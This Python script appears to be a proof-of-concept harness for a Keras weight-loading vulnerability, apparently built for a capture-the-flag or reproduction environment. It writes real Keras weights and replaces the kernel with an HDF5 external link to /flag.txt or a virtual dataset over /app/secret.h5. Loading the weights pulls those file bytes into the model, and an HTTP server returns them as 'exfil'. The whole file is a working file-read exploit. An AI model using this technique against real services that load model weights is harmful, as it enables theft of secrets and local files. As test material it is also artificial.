#!/usr/bin/env python3
"""Thin consumer of the published PyPI keras package (CVE-2026-1669 / 12480).

Builds a Sequential Dense, save_weights to get a real Keras-3 HDF5 layout, then
replaces the kernel dataset with (a) an HDF5 EXTERNAL link to /flag.txt (seed)
or (b) a Virtual Dataset over /app/secret.h5 (residual). Loads via
model.load_weights (real keras.models.Model.load_weights). Flag bytes land in
the kernel and are returned in the HTTP body.
"""
import http.server
import json
import os

import h5py
import numpy as np

os.environ.setdefault("KERAS_BACKEND", "jax")
import keras
from keras import layers


def _flag_blob():
    raw = open("/flag.txt", "rb").read()
    n = max(32, ((len(raw) + 3) // 4) * 4)
    if len(raw) < n:
        raw = raw + b"\x00" * (n - len(raw))
    return raw, (n // 4, 1)


def build_model(shape):
    n = int(shape[0])
    m = keras.Sequential(
        [layers.Input(shape=(n,)), layers.Dense(1, name="dense1")]
    )
    m(np.zeros((1, n), dtype="float32"))
    return m


def _find_kernel(group, shape, prefix=""):
    found = []
    for key in list(group.keys()):
        obj = group[key]
        path = f"{prefix}/{key}" if prefix else key
        if isinstance(obj, h5py.Dataset) and tuple(obj.shape) == tuple(shape):
            found.append(path)
        elif isinstance(obj, h5py.Group):
            found.extend(_find_kernel(obj, shape, path))
    return found


def patch_kernel(path, mode, shape, nbytes):
    with h5py.File(path, "r+") as f:
        hits = _find_kernel(f, shape)
        if not hits:
            raise RuntimeError("keras kernel dataset not found in save_weights file")
        ds_path = hits[0]
        parent_path, name = ds_path.rsplit("/", 1)
        parent = f[parent_path]
        del parent[name]
        if mode == "seed":
            parent.create_dataset(
                name,
                shape=shape,
                dtype="float32",
                external=[("/flag.txt", 0, int(nbytes))],
            )
        else:
            vs = h5py.VirtualSource(
                "/app/secret.h5", "data", shape=shape, dtype="float32"
            )
            layout = h5py.VirtualLayout(shape=shape, dtype="float32")
            layout[...] = vs
            parent.create_virtual_dataset(name, layout)


class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = b'{"ok":true}'
        if self.path.startswith("/exploit"):
            mode = "residual"
            if "mode=" in self.path:
                mode = self.path.split("mode=", 1)[-1].split("&", 1)[0]
            try:
                blob, shape = _flag_blob()
                model = build_model(shape)
                wpath = "/tmp/evil.weights.h5"
                model.save_weights(wpath)
                patch_kernel(wpath, mode, shape, len(blob))
                model.load_weights(wpath)
                text = np.asarray(model.get_weights()[0]).tobytes().decode("latin1")
                open("/tmp/pcb_result.txt", "w").write(text)
                body = json.dumps({"ok": True, "exfil": text}).encode()
            except Exception as e:
                body = json.dumps({"ok": False, "err": str(e)[-200:]}).encode()
        elif self.path in ("/health", "/", "/health/"):
            body = b'{"ok":true}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


http.server.HTTPServer(("0.0.0.0", 3000), H).serve_forever()
